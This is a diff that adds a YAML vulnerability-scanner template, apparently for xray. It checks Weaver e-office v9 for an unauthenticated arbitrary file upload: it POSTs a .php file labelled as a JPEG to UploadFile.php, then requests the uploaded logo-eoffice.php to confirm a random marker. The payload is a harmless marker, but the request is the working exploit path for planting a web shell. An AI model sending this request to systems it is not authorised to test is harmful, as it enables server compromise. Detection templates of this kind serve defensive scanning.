@@ -1,0 +1,25 @@
+name: poc-yaml-weaver-oa-eoffice-v9-upload-getshell
+manual: true
+transport: http
+set:
+    r1: randomLowercase(8)
+rules:
+  - method: POST
+    path: /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId=
+    headers:
+        Content-Type: multipart/form-data;boundary=e64bdf16c554bbc109cecef6451c26a4
+    body: |-
+        --e64bdf16c554bbc109cecef6451c26a4
+        Content-Disposition: form-data; name="Filedata"; filename="test.php"
+        Content-Type: image/jpeg
+        {{r1}}
+        --e64bdf16c554bbc109cecef6451c26a4--
+    expression: response.status == 200 && response.body.bcontains(b"logo-eoffice.php")
+  - method: GET
+    path: /images/logo/logo-eoffice.php
+    follow_redirects: true
+    expression: response.status == 200 && response.body.bcontains(bytes(r1))
+detail:
+    author: szd790056181
+    links:
+        - http://www.ctfiot.com/13682.html
